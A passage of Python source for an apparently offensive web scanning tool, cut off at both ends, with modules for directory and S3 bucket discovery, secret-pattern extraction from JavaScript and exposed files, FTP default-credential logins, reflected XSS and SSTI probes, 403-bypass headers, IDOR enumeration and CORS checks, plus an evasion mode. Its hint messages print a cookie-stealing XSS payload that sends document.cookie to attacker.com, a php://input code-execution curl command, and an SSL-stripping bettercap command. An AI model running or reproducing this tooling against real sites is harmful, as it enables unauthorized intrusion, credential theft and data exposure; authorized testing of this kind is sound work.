        if not os.path.exists(wl):
            wl = "/usr/share/wordlists/dirb/small.txt"
        if os.path.exists(wl):
            step("Gobuster DNS")
            lines = run_tool(
                f"gobuster dns -d {domain} -w {wl} -t {threads(t_level)} --no-error 2>/dev/null",
                "gobuster dns", verbose, timeout=180
            )
            for l in lines:
                if "Found:" in l:
                    sub = l.split("Found:")[-1].strip()
                    ok(f"SUB | {sub}")
                    subs.add(sub)

    info(f"Total unique subdomains: {len(subs)}")
    return list(subs)

# ── Module: Directory Busting ─────────────────────────────────────────────────

def dir_bust(domain, depth=2, t_level=3, evasion=False, proxy=None, verbose=False):
    head("DIRECTORY & FILE BUSTING")
    found_paths = []

    wordlists = [
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/wordlists/dirb/big.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
    ]
    wl = next((w for w in wordlists if os.path.exists(w)), None)
    if not wl:
        err("No wordlist found — install seclists or dirb wordlists")
        return []

    proxy_flag = f"--proxy http://{proxy}" if proxy else ""
    ua = get_ua(evasion)
    ext = "-x php,html,txt,js,json,xml,bak,old,zip,env,config" if depth >= 3 else "-x php,html,txt,js"

    if tool_ok("gobuster"):
        step(f"Gobuster dir — wordlist: {os.path.basename(wl)}")
        cmd = (f"gobuster dir -u https://{domain} -w {wl} -t {threads(t_level)} "
               f"{ext} -k -q --no-error {proxy_flag} "
               f"-a '{ua}' 2>/dev/null")
        lines = run_tool(cmd, "gobuster", verbose, timeout=300)
        for l in lines:
            if "(Status:" in l:
                status = re.search(r'Status:\s*(\d+)', l)
                size   = re.search(r'Size:\s*(\d+)', l)
                path   = l.split(" ")[0].strip()
                if status and int(status.group(1)) not in [404, 400]:
                    ok(f"DIR [{status.group(1)}] {path}  (Size: {size.group(1) if size else '?'})")
                    found_paths.append({"path": path, "status": status.group(1)})

    # Quick manual checks for high-value paths
    step("High-value path check")
    juicy = [
        "/.env", "/.git/HEAD", "/wp-config.php", "/config.php",
        "/admin", "/admin/login", "/phpmyadmin", "/robots.txt",
        "/sitemap.xml", "/.htaccess", "/backup.zip", "/db.sql",
        "/api/v1", "/api/v2", "/swagger", "/swagger-ui.html",
        "/actuator", "/actuator/env", "/console", "/.well-known/security.txt",
        "/server-status", "/server-info", "/.DS_Store",
    ]
    for path in juicy:
        r = req(f"https://{domain}{path}", evasion=evasion, proxy=proxy, timeout=5)
        if r and r.status_code not in [404, 400, 410]:
            found(f"[{r.status_code}] https://{domain}{path}  ({len(r.content)} bytes)")
            found_paths.append({"path": path, "status": str(r.status_code)})

    info(f"Total paths found: {len(found_paths)}")
    return found_paths

# ── Module: S3 Bucket Discovery ───────────────────────────────────────────────

def s3_scan(domain, t_level=3, verbose=False):
    head("S3 BUCKET DISCOVERY")
    company = re.sub(r'\.[^.]+$', '', domain).split(".")[-1]
    patterns = [
        company, f"{company}-backup", f"{company}-dev", f"{company}-staging",
        f"{company}-prod", f"{company}-assets", f"{company}-media",
        f"{company}-files", f"{company}-uploads", f"{company}-static",
        f"{company}-logs", f"{company}-data", f"{company}-test",
        f"{company}-admin", f"{company}-api", f"{company}-internal",
        f"{company}-private", f"{company}-public", f"{company}-cdn",
        f"backup-{company}", f"dev-{company}", f"staging-{company}",
        f"{company}.com", f"www-{company}", f"{company}-www",
    ]
    buckets = []

    def check(name):
        for url in [f"https://{name}.s3.amazonaws.com",
                    f"https://s3.amazonaws.com/{name}"]:
            try:
                r = requests.get(url, timeout=4, verify=False)
                if r.status_code == 200:
                    return {"bucket": name, "url": url, "status": "PUBLIC", "sev": "CRITICAL"}
                if r.status_code == 403:
                    return {"bucket": name, "url": url, "status": "EXISTS(403)", "sev": "MEDIUM"}
            except Exception:
                pass
        return None

    with ThreadPoolExecutor(max_workers=threads(t_level)) as ex:
        futs = [ex.submit(check, p) for p in patterns]
        for f in as_completed(futs):
            r = f.result()
            if r:
                if "CRITICAL" in r["sev"]:
                    crit(f"S3 PUBLIC: {r['url']}")
                    info(f"  aws s3 ls s3://{r['bucket']} --no-sign-request")
                else:
                    warn(f"S3 EXISTS: {r['bucket']}  (403 — try write test)")
                    info(f"  aws s3 cp test.txt s3://{r['bucket']}/ --no-sign-request")
                buckets.append(r)

    if not buckets:
        info("No S3 buckets found")
    return buckets

# ── Module: Security Headers ──────────────────────────────────────────────────

def headers_audit(domain, evasion=False, proxy=None, verbose=False):
    head("SECURITY HEADERS AUDIT")
    r = req(f"https://{domain}", evasion=evasion, proxy=proxy, timeout=8)
    if not r:
        err("Could not connect"); return {}

    important = [
        "Strict-Transport-Security","Content-Security-Policy",
        "X-Frame-Options","X-Content-Type-Options","X-XSS-Protection",
        "Referrer-Policy","Permissions-Policy","Cross-Origin-Opener-Policy",
    ]

    ok(f"HTTP Status: {r.status_code}")
    ok(f"Server: {r.headers.get('server','hidden')}")
    ok(f"X-Powered-By: {r.headers.get('x-powered-by','hidden')}")

    missing = []
    for h in important:
        if h in r.headers:
            ok(f"[PRESENT] {h}: {r.headers[h][:80]}")
        else:
            warn(f"[MISSING] {h}")
            missing.append(h)

    if missing:
        warn(f"{len(missing)} security headers missing — potential bug bounty findings")
    if "Content-Security-Policy" in missing:
        info("CSP missing → test XSS: <script>alert(document.domain)</script>")

    hsts = r.headers.get("Strict-Transport-Security", "")
    if not hsts:
        crit("HSTS missing — SSL stripping attack possible")
        info("  Test: sudo bettercap -iface eth0 -eval 'set http.proxy.sslstrip true; http.proxy on'")

    return {"missing": missing, "server": r.headers.get("server",""), "status": r.status_code}

# ── Module: JavaScript Analysis ───────────────────────────────────────────────

def js_analysis(domain, depth=2, evasion=False, proxy=None, verbose=False):
    head("JAVASCRIPT FILE ANALYSIS")
    findings = {"endpoints": [], "secrets": [], "emails": []}

    # Patterns for secrets
    secret_patterns = {
        "AWS Key":      r'AKIA[0-9A-Z]{16}',
        "AWS Secret":   r'[0-9a-zA-Z/+]{40}',
        "API Key":      r'(?i)(api[_-]?key|apikey)["\s:=]+["\']?([a-zA-Z0-9_\-]{16,64})',
        "Bearer Token": r'(?i)bearer\s+[a-zA-Z0-9\-_\.]{20,}',
        "Private Key":  r'-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----',
        "Google API":   r'AIza[0-9A-Za-z_\-]{35}',
        "Slack Token":  r'xox[baprs]-[0-9a-zA-Z]{10,}',
        "GitHub Token": r'ghp_[0-9a-zA-Z]{36}',
        "JWT":          r'eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+',
        "Password":     r'(?i)(password|passwd|pwd)\s*[=:]\s*["\']([^"\']{6,})["\']',
    }

    endpoint_pattern = r'["\']([/][a-zA-Z0-9_\-/\.?=&#%]+)["\']'
    email_pattern    = r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'

    # Get all JS files from main page
    r = req(f"https://{domain}", evasion=evasion, proxy=proxy, timeout=8)
    if not r:
        err("Cannot reach target"); return findings

    js_urls = re.findall(r'src=["\'](.*?\.js.*?)["\']', r.text)
    js_urls += re.findall(r'["\'](https?://[^"\']+\.js[^"\']*)["\']', r.text)

    # Make absolute
    base = f"https://{domain}"
    abs_urls = []
    for u in js_urls:
        if u.startswith("//"):
            abs_urls.append("https:" + u)
        elif u.startswith("/"):
            abs_urls.append(base + u)
        elif u.startswith("http"):
            abs_urls.append(u)

    info(f"Found {len(abs_urls)} JS files to analyze")

    for js_url in abs_urls[:20]:
        timed_delay(3, evasion)
        js_r = req(js_url, evasion=evasion, proxy=proxy, timeout=8)
        if not js_r or js_r.status_code != 200:
            continue

        content = js_r.text
        js_file = js_url.split("/")[-1]
        step(f"Analyzing: {js_file}")

        # Endpoints
        eps = re.findall(endpoint_pattern, content)
        api_eps = [e for e in eps if len(e) > 3 and
                   any(k in e.lower() for k in ["/api/","/v1/","/v2/","/admin","/user","/auth","/login","/upload"])]
        for ep in set(api_eps[:5]):
            ok(f"JS ENDPOINT | {js_file} → {ep}")
            findings["endpoints"].append(ep)

        # Emails
        emails = re.findall(email_pattern, content)
        for email in set(emails[:5]):
            if domain.split(".")[0] in email or "admin" in email:
                ok(f"JS EMAIL | {email}")
                findings["emails"].append(email)

        # Secrets
        for sname, pattern in secret_patterns.items():
            matches = re.findall(pattern, content)
            if matches:
                crit(f"POTENTIAL SECRET in {js_file} | {sname}: {str(matches[0])[:60]}")
                findings["secrets"].append({"file": js_file, "type": sname, "match": str(matches[0])[:60]})

    info(f"JS Analysis done | Endpoints: {len(findings['endpoints'])} | Secrets: {len(findings['secrets'])}")
    return findings

# ── Module: PHP Surface Scan ──────────────────────────────────────────────────

def php_scan(domain, evasion=False, proxy=None, verbose=False):
    head("PHP SURFACE SCAN")
    findings = []

    r = req(f"https://{domain}", evasion=evasion, proxy=proxy, timeout=8)
    if r:
        powered = r.headers.get("x-powered-by","")
        if "php" in powered.lower():
            ok(f"PHP Version: {powered}")
            findings.append(f"PHP Version exposed: {powered}")
            info("Check CVEs: searchsploit php " + powered.split("/")[-1])

    # PHP-specific paths
    php_paths = [
        "/phpinfo.php", "/info.php", "/test.php", "/php.php",
        "/admin.php", "/login.php", "/wp-login.php", "/xmlrpc.php",
        "/index.php", "/config.php", "/setup.php", "/install.php",
        "/.php_cs", "/composer.json", "/composer.lock",
        "/php-errors.log", "/error_log",
    ]
    for path in php_paths:
        r = req(f"https://{domain}{path}", evasion=evasion, proxy=proxy, timeout=5)
        if r and r.status_code not in [404, 410, 400]:
            if r.status_code == 200 and len(r.content) > 100:
                found(f"PHP [{r.status_code}] https://{domain}{path}  ({len(r.content)} bytes)")
                if "phpinfo" in r.text.lower() and "PHP Version" in r.text:
                    crit(f"PHPINFO PAGE EXPOSED: {path}")
                findings.append({"path": path, "status": r.status_code})
            else:
                ok(f"PHP [{r.status_code}] {path}")

    # PHP wrapper test (only if authorized)
    info("PHP wrappers (test manually in authorized scope):")
    info(f"  curl -sk 'https://{domain}/?page=php://filter/convert.base64-encode/resource=index'")
    info(f"  curl -sk 'https://{domain}/?file=php://input' -d '<?php system(id); ?>'")

    return findings

# ── Module: Nikto ─────────────────────────────────────────────────────────────

def nikto_scan(domain, t_level=3, proxy=None, verbose=False):
    head("NIKTO WEB SERVER SCAN")
    if not tool_ok("nikto"):
        err("nikto not found"); return []

    proxy_flag = f"-useproxy http://{proxy}" if proxy else ""
    timeout_val = 120 if t_level <= 2 else 60
    cmd = f"nikto -h https://{domain} -nointeractive {proxy_flag} 2>/dev/null"
    step(f"Running nikto (timeout: {timeout_val}s)")
    lines = run_tool(cmd, "nikto", verbose, timeout_val)

    useful = []
    skip_prefixes = ["- Nikto","- Target","- Start Time","- End Time",
                     "+ No web application","+ Server leaks","+ The anti-clickjacking"]
    for l in lines:
        if l.startswith("+") and not any(l.startswith(s) for s in skip_prefixes):
            ok(f"NIKTO | {l.strip()}")
            useful.append(l.strip())
        if "OSVDB" in l or "CVE" in l:
            crit(f"NIKTO VULN | {l.strip()}")
            useful.append(l.strip())

    return useful

# ── Module: FTP Check ────────────────────────────────────────────────────────

def ftp_check(target, verbose=False, payload_file=None):
    import ftplib
    head("FTP SECURITY CHECK")
    findings = []

    FTP_CREDS = get_ftp_creds(payload_file)

    # Check port open
    for port in [21, 2121]:
        try:
            s = socket.socket(); s.settimeout(4)
            if s.connect_ex((target, port)) == 0:
                ok(f"FTP port {port} OPEN")
                findings.append({"port": port})
            s.close()
        except Exception:
            pass

    if not findings:
        warn("FTP ports 21/2121 closed or filtered")
        return findings

    port = findings[0]["port"]

    # Banner grab
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=8)
        banner = ftp.getwelcome()
        ok(f"FTP Banner : {banner[:120]}")
        findings.append({"type": "banner", "value": banner[:120]})
        ftp.quit()
    except Exception as e:
        info(f"FTP banner error: {str(e)[:60]}")

    # Credential test
    step("Testing FTP credentials (default + anonymous)...")
    success_creds = []
    for user, passwd in FTP_CREDS:
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=6)
            ftp.login(user, passwd)
            crit(f"FTP LOGIN OK  →  {user}:{passwd}")
            findings.append({"type": "cred", "user": user, "pass": passwd})
            success_creds.append((user, passwd))
            try:
                files = ftp.nlst()
                ok(f"FTP Directory listing ({len(files)} items):")
                for f in files[:25]:
                    info(f"  {f}")
                findings.append({"type": "files", "list": files[:25]})
            except Exception:
                pass
            ftp.quit()
        except ftplib.error_perm:
            pass
        except Exception:
            pass

    if not success_creds:
        info("No default FTP credentials worked")
    return findings


# ── Module: SSH Check ─────────────────────────────────────────────────────────

def ssh_check(target, verbose=False):
    head("SSH SECURITY CHECK")
    findings = []

    for port in [22, 2222, 222, 2022]:
        try:
            s = socket.socket(); s.settimeout(4)
            if s.connect_ex((target, port)) != 0:
                s.close(); continue
            ok(f"SSH port {port} OPEN")

            # Banner
            s2 = socket.socket(); s2.settimeout(5)
            s2.connect((target, port))
            banner = s2.recv(256).decode("utf-8", errors="ignore").strip()
            s2.close()
            ok(f"SSH Banner : {banner}")
            findings.append({"port": port, "banner": banner})

            ver = re.search(r'SSH-[\d.]+-(\S+)', banner)
            if ver:
                v = ver.group(1)
                ok(f"SSH Version: {v}")
                info(f"searchsploit: searchsploit openssh {v.split('_')[0]}")

            # Nmap SSH scripts
            if tool_ok("nmap"):
                step(f"SSH audit scripts (port {port})")
                lines = run_tool(
                    f"nmap -p {port} --script ssh-auth-methods,ssh-hostkey "
                    f"--script-args ssh.user=root {target} 2>/dev/null",
                    "nmap-ssh", verbose, 25
                )
                for l in lines:
                    if any(k in l.lower() for k in ["publickey","password","keyboard","none","hostkey","rsa","ecdsa"]):
                        ok(f"SSH | {l.strip()}")
                        findings.append({"type": "auth_info", "value": l.strip()})
                    if "none" in l.lower() and "auth_method" in l.lower():
                        crit(f"SSH NO-AUTH allowed: {l.strip()}")
            s.close()
            break
        except Exception:
            pass

    if not findings:
        info("SSH not accessible on common ports")
    return findings


# ── Module: Sensitive Information Leak ───────────────────────────────────────

def sensitive_info(domain, evasion=False, proxy=None, verbose=False):
    head("SENSITIVE INFORMATION LEAK")
    findings = []

    SENSITIVE_PATHS = [
        # Credentials & config
        "/.env", "/.env.local", "/.env.production", "/.env.backup",
        "/config.php", "/config.js", "/config.json", "/config.yaml",
        "/configuration.php", "/settings.php", "/database.php",
        "/wp-config.php", "/wp-config.php.bak",
        "/application.properties", "/application.yml",
        # Git / VCS
        "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
        "/.svn/entries", "/.hg/hgrc",
        # Backups
        "/backup.zip", "/backup.tar.gz", "/backup.sql",
        "/db.sql", "/database.sql", "/dump.sql",
        "/site.zip", "/www.zip", "/html.zip",
        "/index.php.bak", "/index.bak",
        # Logs
        "/error.log", "/error_log", "/php_errors.log",
        "/access.log", "/debug.log", "/laravel.log",
        "/storage/logs/laravel.log",
        # Info pages
        "/phpinfo.php", "/info.php", "/test.php",
        "/server-status", "/server-info",
        # API keys / tokens
        "/.aws/credentials", "/.ssh/id_rsa", "/.ssh/known_hosts",
        "/api/swagger.json", "/api/openapi.json",
        "/swagger.json", "/openapi.yaml", "/api-docs",
        # CMS
        "/xmlrpc.php", "/wp-json/wp/v2/users",
        "/administrator/", "/joomla.xml",
        # DS_Store / other leaks
        "/.DS_Store", "/thumbs.db", "/web.config",
        "/crossdomain.xml", "/clientaccesspolicy.xml",
    ]

    SENSITIVE_PATTERNS = {
        "Password":     r'(?i)(password|passwd|pwd)\s*[=:]\s*["\']?([^\s"\'&]{4,})',
        "API Key":      r'(?i)(api[_-]?key|apikey|api_secret)\s*[=:]\s*["\']?([a-zA-Z0-9_\-]{16,})',
        "AWS Key":      r'AKIA[0-9A-Z]{16}',
        "Private Key":  r'-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----',
        "DB String":    r'(?i)(mysql|postgres|mongodb|redis)://[^\s"\']+',
        "Secret Key":   r'(?i)(secret[_-]?key|secret)\s*[=:]\s*["\']?([a-zA-Z0-9_\-]{16,})',
        "Token":        r'(?i)(token|auth_token|access_token)\s*[=:]\s*["\']?([a-zA-Z0-9_\-\.]{20,})',
    }

    # Baseline to filter CMS false positives
    _base_r   = req(f"https://{domain}", evasion=evasion, proxy=proxy, timeout=5)
    _base_sz  = len(_base_r.content) if _base_r else 0
    _fake_r   = req(f"https://{domain}/ns-fake-404-xyz987", evasion=evasion, proxy=proxy, timeout=5)
    _fake_sz  = len(_fake_r.content) if _fake_r else 0

    step(f"Scanning {len(SENSITIVE_PATHS)} sensitive paths...")
    for path in SENSITIVE_PATHS:
        r = req(f"https://{domain}{path}", evasion=evasion, proxy=proxy, timeout=4)
        if not r:
            r = req(f"http://{domain}{path}", evasion=evasion, proxy=proxy, timeout=4)
        if not r:
            continue

        if r.status_code in [200, 206]:
            size = len(r.content)
            if size < 10:
                continue
            # Skip CMS homepage redirects (false positives)
            if _base_sz > 0 and abs(size - _base_sz) < 500:
                continue
            if _fake_sz > 0 and abs(size - _fake_sz) < 500:
                continue

            # Check content for sensitive patterns
            hits = []
            for pname, pattern in SENSITIVE_PATTERNS.items():
                matches = re.findall(pattern, r.text[:5000])
                if matches:
                    hits.append(f"{pname}: {str(matches[0])[:60]}")

            if hits:
                crit(f"[{r.status_code}] https://{domain}{path} ({size}b)")
                for h in hits:
                    crit(f"  SECRET FOUND → {h}")
                findings.append({"path": path, "status": r.status_code,
                                 "size": size, "secrets": hits})
            else:
                found(f"[{r.status_code}] https://{domain}{path} ({size}b)")
                findings.append({"path": path, "status": r.status_code, "size": size})

            # Special checks
            if ".git/HEAD" in path and "ref:" in r.text:
                crit(f"GIT REPO EXPOSED at https://{domain}/.git/")
                info(f"  Dump with: git-dumper https://{domain}/.git/ ./dumped_repo")

            if "phpinfo" in path and "PHP Version" in r.text:
                crit(f"PHPINFO PAGE EXPOSED: https://{domain}{path}")

            if "wp-json/wp/v2/users" in path:
                try:
                    users = r.json()
                    for u in users[:5]:
                        crit(f"WP USER LEAK | ID:{u.get('id')} Name:{u.get('name')} Slug:{u.get('slug')}")
                except Exception:
                    pass

        elif r.status_code == 403:
            ok(f"[403 EXISTS] {path} — forbidden but file exists")
            findings.append({"path": path, "status": 403})

    if not findings:
        info("No sensitive files found (try deeper scan with -D 4)")
    return findings


# ── Module: Cookie & Session Analysis ────────────────────────────────────────

def cookie_session_analysis(domain, evasion=False, proxy=None, verbose=False):
    head("COOKIE & SESSION ANALYSIS")
    findings = []

    r = req(f"https://{domain}", evasion=evasion, proxy=proxy, timeout=8)
    if not r:
        err("Cannot connect"); return findings

    if not r.cookies:
        info("No cookies set on main page")
    else:
        print(f"\n  {'COOKIE NAME':<30} {'VALUE (first 30)':<32} {'Secure':<8} {'HttpOnly':<10} {'SameSite':<12} {'ISSUE'}")
        print(f"  {'─'*100}")

        for cookie in r.cookies:
            secure   = bool(cookie.secure)
            httponly = bool(cookie.has_nonstandard_attr("HttpOnly"))
            samesite = cookie._rest.get("SameSite","MISSING") if hasattr(cookie,"_rest") else "?"
            val_preview = str(cookie.value)[:30] if cookie.value else ""

            issues = []
            if not secure:   issues.append("NO Secure flag")
            if not httponly: issues.append("NO HttpOnly")
            if samesite in ["MISSING","None","none"]: issues.append("SameSite weak")
            if len(str(cookie.value)) < 8: issues.append("Weak entropy")

            # Check if value looks like base64 / JWT
            if re.match(r'^eyJ', str(cookie.value)):
                issues.append("JWT token in cookie")
                crit(f"JWT in cookie '{cookie.name}' — decode: jwt.io")
            if re.match(r'^[a-f0-9]{32}$', str(cookie.value).lower()):
                issues.append("MD5-like session ID (weak)")

            issue_str = " | ".join(issues) if issues else "OK"
            color = R if issues else G
            s_flag  = f"{G}YES{NC}" if secure   else f"{R}NO{NC}"
            h_flag  = f"{G}YES{NC}" if httponly  else f"{R}NO{NC}"
            same    = f"{G}{samesite}{NC}" if samesite not in ["MISSING","None","none"] else f"{R}{samesite}{NC}"

            print(f"  {cookie.name:<30} {val_preview:<32} {s_flag:<16} {h_flag:<18} {same:<20} {color}{issue_str}{NC}")
            findings.append({
                "name": cookie.name, "secure": secure,
                "httponly": httponly, "samesite": samesite,
                "issues": issues, "value_preview": val_preview
            })

        # Cookie steal PoC
        has_issues = [f for f in findings if f.get("issues")]
        if has_issues:
            print()
            warn(f"{len(has_issues)} cookies with security issues found")
            for f in has_issues:
                crit(f"Cookie '{f['name']}': {' | '.join(f['issues'])}")
                if "NO HttpOnly" in f.get("issues",[]):
                    info(f"  XSS steal PoC: <script>document.location='http://attacker.com/?c='+document.cookie</script>")

    # Check Set-Cookie from response headers
    sc = r.headers.get("Set-Cookie","")
    if sc:
        ok(f"Set-Cookie header: {sc[:100]}")

    return findings


# ── Module: XSS Check ─────────────────────────────────────────────────────────

def xss_check(domain, evasion=False, proxy=None, verbose=False, payload_file=None):
    head("XSS DETECTION")
    findings = []

    XSS_PAYLOADS = get_xss_payloads(payload_file)

    MARKER = "XSS_WEBSPY_TEST"

    r = req(f"https://{domain}", evasion=evasion, proxy=proxy, timeout=8)
    if not r:
        err("Cannot connect"); return findings

    # Extract forms and parameters
    forms = re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.I|re.S)
    inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', r.text, re.I)
    get_params = re.findall(r'[?&]([a-zA-Z0-9_\-]+)=', r.text)

    # URL parameters from page links
    links = re.findall(r'href=["\']([^"\']+)["\']', r.text, re.I)
    for link in links[:30]:
        params = re.findall(r'[?&]([a-zA-Z0-9_\-]+)=([^&]*)', link)
        for pname, pval in params:
            if pname not in get_params:
                get_params.append(pname)

    all_params = list(set(inputs + get_params))
    info(f"Found {len(all_params)} parameters to test: {', '.join(all_params[:10])}")

    step("Testing reflected XSS on parameters...")
    for param in all_params[:20]:
        for payload in XSS_PAYLOADS[:4]:
            test_url = f"https://{domain}/?{param}={requests.utils.quote(payload)}"
            r2 = req(test_url, evasion=evasion, proxy=proxy, timeout=5)
            if r2 and payload in r2.text:
                crit(f"REFLECTED XSS found!")
                crit(f"  Parameter : {param}")
                crit(f"  Payload   : {payload}")
                crit(f"  URL       : {test_url}")
                findings.append({"type": "reflected_xss", "param": param,
                                 "payload": payload, "url": test_url})
                break

    # DOM XSS hints
    step("Checking DOM XSS sinks...")
    dom_sinks = ["document.write(", "innerHTML", "outerHTML", "eval(",
                 "setTimeout(", "setInterval(", "location.hash", "document.URL"]
    if r:
        for sink in dom_sinks:
            if sink in r.text:
                warn(f"DOM sink found: {sink} — manual check needed")
                findings.append({"type": "dom_sink", "sink": sink})

    # SSTI check
    ssti_url = f"https://{domain}/?q=49"
    r3 = req(ssti_url, evasion=evasion, proxy=proxy, timeout=5)
    if r3 and "49" in r3.text:
        r4 = req(f"https://{domain}/?q={{{{7*7}}}}", evasion=evasion, proxy=proxy, timeout=5)
        if r4 and "49" in r4.text:
            crit("POTENTIAL SSTI (Server Side Template Injection) detected!")
            findings.append({"type": "ssti"})

    if not findings:
        info("No XSS found automatically — manual testing recommended")
        info("  Use Burp Suite Intruder for deeper parameter fuzzing")
    return findings


# ── Module: CSRF & Broken Access Control ────────────────────────────────────

def csrf_bac_check(domain, evasion=False, proxy=None, verbose=False, payload_file=None):
    head("CSRF + BROKEN ACCESS CONTROL")
    findings = []

    r = req(f"https://{domain}", evasion=evasion, proxy=proxy, timeout=8)
    if not r:
        err("Cannot connect"); return findings

    # ── CSRF Checks ──────────────────────────────────────────────────────────
    step("CSRF token analysis...")
    forms = re.findall(r'<form[^>]*action=["\']?([^"\'>\s]*)["\']?[^>]*>(.*?)</form>',
                       r.text, re.I|re.S)

    csrf_tokens = re.findall(
        r'(?i)(csrf|_token|authenticity_token|nonce)["\']?\s*[=:value"\s]+["\']([a-zA-Z0-9_\-+=/]{16,})',
        r.text
    )

    if forms:
        info(f"Found {len(forms)} forms on page")
        for action, fbody in forms[:5]:
            has_csrf = bool(re.search(
                r'(?i)(csrf|_token|authenticity_token|nonce)',
                fbody
            ))
            method = re.search(r'method=["\']?(\w+)', fbody, re.I)
            method = method.group(1).upper() if method else "GET"

            if not has_csrf and method == "POST":
                crit(f"CSRF TOKEN MISSING on POST form → action: {action or '/'}")
                info(f"  PoC: Create a page with a hidden form posting to {action}")
                findings.append({"type": "csrf_missing", "action": action, "method": method})
            elif has_csrf:
                ok(f"CSRF token present on form → {action or '/'}")

    if csrf_tokens:
        for tname, tval in csrf_tokens[:3]:
            ok(f"CSRF Token found: {tname} = {tval[:20]}...")
            findings.append({"type": "csrf_token", "name": tname, "value": tval[:20]})

    # ── Broken Access Control ─────────────────────────────────────────────────
    step("Broken Access Control checks...")

    ADMIN_PATHS = get_csrf_paths(payload_file)

    BAC_BYPASS_HEADERS = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
    ]

    for path in ADMIN_PATHS:
        r2 = req(f"https://{domain}{path}", evasion=evasion, proxy=proxy, timeout=5)
        if not r2:
            continue
        if r2.status_code == 200 and len(r2.content) > 200:
            crit(f"ADMIN PATH ACCESSIBLE (no auth): [{r2.status_code}] {path}")
            title = re.search(r'<title[^>]*>(.*?)</title>', r2.text, re.I)
            if title:
                info(f"  Title: {title.group(1).strip()[:60]}")
            findings.append({"type": "bac", "path": path, "status": r2.status_code})
        elif r2.status_code == 403:
            # Try header bypass
            for hdr in BAC_BYPASS_HEADERS:
                r3 = req(f"https://{domain}/", evasion=evasion, proxy=proxy,
                         headers=hdr, timeout=4)
                if r3 and r3.status_code == 200:
                    h = list(hdr.keys())[0]
                    crit(f"403 BYPASS via header {h} on {path}")
                    findings.append({"type": "bac_bypass", "path": path,
                                     "header": h, "status": r3.status_code})
                    break

    # IDOR test — check if ID params can be enumerated
    step("IDOR parameter detection...")
    id_params = re.findall(r'[?&](id|user_id|uid|account|profile|order|post)=(\d+)', r.text)
    if id_params:
        for pname, pval in id_params[:3]:
            test_ids = [str(int(pval)-1), "1", "2", "admin", "0"]
            for tid in test_ids:
                test_url = f"https://{domain}?{pname}={tid}"
                r4 = req(test_url, evasion=evasion, proxy=proxy, timeout=5)
                if r4 and r4.status_code == 200 and len(r4.content) > 300:
                    warn(f"Potential IDOR: {pname}={tid} → {r4.status_code} ({len(r4.content)}b)")
                    info(f"  URL: {test_url}")
                    findings.append({"type": "idor", "param": pname,
                                     "test_value": tid, "url": test_url})

    if not findings:
        info("No obvious CSRF/BAC issues found — deeper manual testing needed")
    return findings


# ── Module: API Discovery & Misconfiguration ──────────────────────────────────

def api_discovery(domain, evasion=False, proxy=None, verbose=False):
    head("API DISCOVERY & MISCONFIGURATION")
    findings = []

    API_PATHS = [
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/api/users", "/api/user", "/api/admin",
        "/api/config", "/api/settings", "/api/keys",
        "/graphql", "/graphiql", "/graphql/console",
        "/swagger", "/swagger-ui", "/swagger-ui.html",
        "/api-docs", "/openapi.json", "/swagger.json",
        "/v1", "/v2", "/v3",
        "/rest", "/rest/api",
        "/ws", "/websocket",
        "/api/auth", "/api/login", "/api/token",
        "/api/register", "/api/signup",
        "/_ah/api", "/__api__",
    ]

    # Get baseline homepage size to filter false positives (WordPress/CMS redirects)
    _base = req(f"https://{domain}", evasion=evasion, proxy=proxy, timeout=6)
    _base_size = len(_base.content) if _base else 0
    _base_404 = req(f"https://{domain}/this-path-should-not-exist-xyz123abc", evasion=evasion, proxy=proxy, timeout=5)
    _fake_404_size = len(_base_404.content) if _base_404 else 0

    step(f"Scanning {len(API_PATHS)} API endpoints...")
    for path in API_PATHS:
        for scheme in ["https", "http"]:
            r = req(f"{scheme}://{domain}{path}", evasion=evasion, proxy=proxy, timeout=5)
            if not r or r.status_code in [404, 410]:
                continue

            ctype = r.headers.get("content-type","")
            is_json = "json" in ctype or r.text.strip().startswith(("{","["))
            size = len(r.content)

            # Filter out CMS false positives (same size as homepage or fake 404)
            if size == _base_size or (_fake_404_size > 0 and abs(size - _fake_404_size) < 500):
                continue

            if r.status_code in [200, 201] and size > 50:
                found(f"API [{r.status_code}] {path}  ({size}b)  JSON:{is_json}")
                findings.append({"path": path, "status": r.status_code,
                                 "is_json": is_json, "size": size})

                if is_json:
                    try:
                        data = r.json()
                        ok(f"  JSON Keys: {list(data.keys())[:8] if isinstance(data,dict) else 'array'}")
                        # Look for sensitive keys
                        sensitive_keys = ["password","token","key","secret","auth",
                                         "credential","api_key","access_token"]
                        if isinstance(data, dict):
                            for sk in sensitive_keys:
                                if any(sk in k.lower() for k in data.keys()):
                                    crit(f"  SENSITIVE KEY in API response: {[k for k in data.keys() if sk in k.lower()]}")
                    except Exception:
                        pass

                # GraphQL introspection
                if "graphql" in path.lower():
                    r2 = req(f"{scheme}://{domain}{path}",
                             evasion=evasion, proxy=proxy, timeout=8,
                             json={"query": "{__schema{types{name}}}"})
                    if r2 and r2.status_code == 200 and "__schema" in r2.text:
                        crit("GraphQL INTROSPECTION ENABLED — full schema exposed!")
                        findings.append({"type": "graphql_introspection", "path": path})

            elif r.status_code == 403:
                ok(f"API [403 EXISTS] {path}")
                findings.append({"path": path, "status": 403})
            break

    # CORS misconfiguration check
    step("CORS misconfiguration check...")
    cors_origins = [
        "https://evil.com",
        "null",
        f"https://{domain}.evil.com",
    ]
    for origin in cors_origins:
        r = req(f"https://{domain}/api", evasion=evasion, proxy=proxy,
                timeout=5, headers={"Origin": origin})
        if r:
            acao = r.headers.get("Access-Control-Allow-Origin","")
            acac = r.headers.get("Access-Control-Allow-Credentials","")
            if acao == origin or acao == "*":
                if acac == "true":
